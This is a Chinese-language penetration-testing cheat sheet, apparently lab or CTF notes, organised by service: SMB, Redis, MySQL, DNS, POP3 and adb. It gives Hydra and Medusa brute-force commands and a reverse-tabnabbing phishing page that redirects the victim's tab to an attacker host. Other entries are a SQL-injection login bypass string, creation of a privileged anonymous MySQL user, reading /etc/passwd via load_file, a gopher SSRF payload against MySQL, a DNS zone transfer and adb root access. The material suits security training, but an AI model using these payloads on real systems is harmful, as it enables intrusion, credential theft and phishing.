-R    RID范围要枚举（默认值：500-550,1000-1050，隐含-r）
-K    指定不对应次数n。继续搜索RID，直到n个连续的RID与用户名不对应，Impies RID范围结束于999999.对DC有用
-l    通过LDAP 389 / TCP获取一些（有限的）信息（仅适用于DN）
-s    文件暴力猜测共享名称
-k    user 远程系统上存在的用户（默认值：administrator，guest，krbtgt，domain admins，root，bin，none）用于获取sid与"lookupsid known_username"使用逗号尝试几个用户："-k admin，user1，user2"
-o    获取操作系统信息
-i    获取打印机信息
-w    手动指定工作组（通常自动找到）
-n    做一个nmblookup（类似于nbtstat）
-v    详细输出，显示正在运行的完整命令（net，rpcclient等）
```
### nxc

github: https://github.com/Pennyw0rth/NetExec
>该项目最初由@byt3bl33d3r于2015年创建，称为CrackMapExec

安装：
```
wget https://github.com/Pennyw0rth/NetExec/releases/download/v1.1.0/nxc
mv nxc /usr/bin/
chmod +x /usr/bin/nxc
```
使用：
```
sudo nxc smb 192.168.56.110 --shares -u username -p ''
```

### rpcclient
```
rpcclient -U "" -N 192.168.56.110
```

## 爆破

### Hydra暴力破解smb协议

```
hydra -l administrator -P /usr/share/wordlists/rockyou.txt 192.168.31.173 smb
```
### medusa 爆破smb用户密码

```
medusa -h 192.168.56.106 -u jenkins -P rockyou.txt -M smbnt
```
### metasploit（msf）

```
msf> use auxiliary/scanner/smb/smb_version
```
## samba报错集合

```
1.tree connect failed:NT_STATUS_BAD_NETWORK_NAME
是因为共享名输入的不对
也有可能是共享路径不存在

2.samba 文件有读写权限，共享里也有读写，但是还是不能创建
NT_STATUS_ACCESS_DENIED making remote directory  
错误的原因：SELINUX没有关
解决方法：SELINUX=disabled

3.可以连接上去，但是出现NT_STATUS_OBJECT_NAME_COLLISION making remote directory 1\
原因：因为文件夹1已经创建

4.protocol negotiation failed:NT_STATUS_INVALID_NETWORK_RESPONSE
原因：hosts 网段不允许

5.在连接的过程中，tree connect failed:NT_STATUS_ACCESS_DENIED 
原因：不允许该用户访问
解决方法：valid users = 该用户
```

##### 参考资料

- https://zhuanlan.zhihu.com/p/356104384
- https://blog.csdn.net/qq_63844103/article/details/127219997

#### 钓鱼攻击漏洞（反向标签劫持攻击）

创建恶意链接页面

```shell
<!DOCTYPE html> 
<html> 
<body> 
<script> 
    if(window.opener) window.opener.parent.location.replace('http://192.168.56.102:1234/index.html'); 
    if(window.opener != window) window.opener.parent.location.replace('http://192.168.56.102:1234/index.html'); 
</script> 
</body> 
</html>
```

创建钓鱼登陆页面（复制登陆页面的源码）

```shell
复制登陆页面的源码创建一个html页面
```

# redis 6379

```
查询数据库中有哪些key
keys *


查询指定key的value值
get <key_name>
```
# mysql 3306

![[../Pasted image 20250514191623.png]]

默认端口：3306

万能密码：
​    
```shell
admin' or 1=1#\123456
```

#### MySQL 匿名

```
添加匿名用户
mysql> CREATE USER ”@”;
mysql>GRANT USAGE ON *.* TO ”@” WITH GRANT OPTION;
mysql> GRANT ALL PRIVILEGES ON *.* TO ”@”;
mysql>FLUSH PRIVILEGES;
```

#### MySQL文件读取
```sql
select load_file('/etc/passwd');
```
#### gopher攻击mysql

Gopherus工具是用来专门生成gopher协议的payload工具，通过gopher协议的以及各种被攻击应用的tcp包特点来构造payload

目前支持生成payload应用有：
```
MySQL (Port:3306)
FastCGI (Port:9000)
Memcached (Port:11211)
Redis (Port:6379)
Zabbix (Port:10050)
SMTP (Port:25)
```
下载
```shell
git clone https://www.github.com/tarunkant/Gopherus.git
./gopherus.py -h
```

使用
使用gopher协议查询数据库名称，要在SSRF提交处多执行几次才能够成功，数据库名称为joomla
```
./gopherus.py --exploit mysql
Give MySQL username: goblin                             
Give query to execute: show databases;

gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%10%00%00%00%03%73%68%6f%77%20%64%61%74%61%62%61%73%65%73%3b%01%00%00%00%01
```

#### http3环境访问

首先安装HTTP3所需要的环境，详情见代码块。

```shell
1.下载quiche

git clone --recursive https://www.github.com/cloudflare/quiche

2.安装cargo组件

sudo apt install cargo

3.cmake组件

sudo apt install cmake

4.安装例子

有报错，执行下一步

cd ./quiche

cargo build --examples

5.卸载rustc

apt purge rustc

6.重新安装

curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh

7.设置环境变量

source $HOME/.cargo/env

8.重新下载

cargo build --examples

9.对安装内容检查

cargo test

爆出一堆ok检查无误

10.利用http3去访问url
cd  /quiche/target/debug/examples
./http3-client https://192.168.56.108
————————————————
版权声明：本文为CSDN博主「梅_花_七」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/weixin_54431413/article/details/125393128
```

```shell
┌──(root㉿kali)-[/quiche/target/debug/examples]
└─# ./http3-client https://192.168.56.108
<html>
	<head>
	<title>Information Page</title>
	</head>
	<body>
		Greetings Developers!!

		I am having two announcements that I need to share with you:

		1. We no longer require functionality at /internalResourceFeTcher.php in our main production servers.So I will be removing the same by this week.
		2. All developers are requested not to put any configuration's backup file (.bak) in main production servers as they are readable by every one.


		Regards,
		site_admin
	</body>
</html>
   
```

# DNS 服务

53端口为DNS(Domain Name Server，域名服务器)服务器所开放，主要用于域名解析，DNS服务在NT系统中使用的最为广泛。通过DNS服务器可以实现域名与IP地址之间的转换，只要记住域名就可以快速访问网站。

### dig 从指定的dns服务器进行查询

dig [@server] [-b address] [-c class] [-f filename] [-k filename] [-m] [-p port#] [-q name] [-t type] [-x addr] [-y [hmac:]name:key] [-4] [-6] [name] [type] [class] [queryopt…]

使用dig命令，您可以查询各种DNS记录的信息，包括主机地址，邮件交换和域名服务器。它是系统管理员中用于排除DNS问题的最常用工具，它具很高的灵活性和易用性。
 
@<服务器地址>：指定进行域名解析的域名服务器；
-b<ip地址>：当主机具有多个IP地址，指定使用本机的哪个IP地址向域名服务器发送域名查询请求；
-f<文件名称>：指定dig以批处理的方式运行，指定的文件中保存着需要批处理查询的DNS任务信息；
-P：指定域名服务器所使用端口号；
-t<类型>：指定要查询的DNS数据类型；
-x<IP地址>：执行逆向域名查询；
-4：使用IPv4；
-6：使用IPv6；
-h：显示指令帮助信息。

```
dig axfr @192.168.56.139 blackhat.local
```


# POP3（邮件协议3）服务

110端口是为POP3（邮件协议3）服务开放的，POP2、POP3都是主要用于接收邮件的，目前POP3使用的比较多，许多服务器都同时支持POP2和POP3, 单单POP3服务在用户名和密码交换缓冲区溢出的漏洞就不少于20个，比如WebEasyMail POP3 Server合法用户名信息泄露漏洞，通过该漏洞远程攻击者可以验证用户账户的存在

#### banner信息获取

```bash
nc -nv <IP> 110
```

#### nmap pop3脚本扫描

```bash
nmap --scripts "pop3-capabilities or pop3-ntlm-info" -sV -port <PORT> <IP> 
```

#### pop3爆破

可以使用hydra或者xhydra。hydra-wizard可以提供命令行向导配置。

```bash
hydra -s PORT -l USERNAME -p PASSWORD -e nsr -t 22 IP pop3
```

- PORT：pop3服务所用端口号
- USERNAME：单个用户名
- PASSWORD：单个密码
- IP：pop3服务器地址

```bash
hydra -s PORT -L USERNAME_LIST -P PASSWORD_LIST -e nsr -t 22 IP pop3
```

- PORT：pop3服务所用端口号
- USERNAME_LIST：用户名文件
- PASSWORD_LIST：密码文件
- IP：pop3服务器地址

#### pop命令

```bash
USER whgojp          	使用账号whgojp登陆
PASS password    		输入密码			 
STAT              		获取邮件服务器上的邮件数量和总大小
LIST             		列出所有邮件及其大小。如果指定消息号，则只显示该消息的大小
RETR n            		检索消息号为n的邮件的全部内容
DELE n            		删除邮件n
RSET             		撤销任何更改，恢复到初始状态
QUIT            		退出
TOP msg n         		显示消息号为msg的邮件的前n行用于查看邮件的标题行
CAPA              		获取服务器支持的能力列表
```

#### 命令行登录pop邮箱

##### telnet方式

```bash
telnet IP PORT
```

- IP：pop服务所用IP
- PORT：pop服务所用端口号

##### nc方式

```bash
nc IP PORT
```

- IP：pop服务所用IP
- PORT：pop服务所用端口号


##### 例子

```bash
root@kali:~# telnet $ip 110
 +OK beta POP3 server (JAMES POP3 Server 2.3.2) ready 
 USER billydean    
 +OK
 PASS password
 +OK Welcome billydean
 
 list
 
 +OK 2 1807
 1 786
 2 1021

 retr 1
 
 +OK Message follows
 From: jamesbrown@motown.com
 Dear Billy Dean,

 Here is your login for remote desktop ... try not to forget it this time!
 username: billydean
 password: PA$$W0RD!Z
```

# adb 5555

连接
```
adb connect 192.168.56.127:5555
```
查看设备列表及状态
```
adb devices -l
```
进入交互式shell
```
adb shell
```
提权
```bash
adb root
```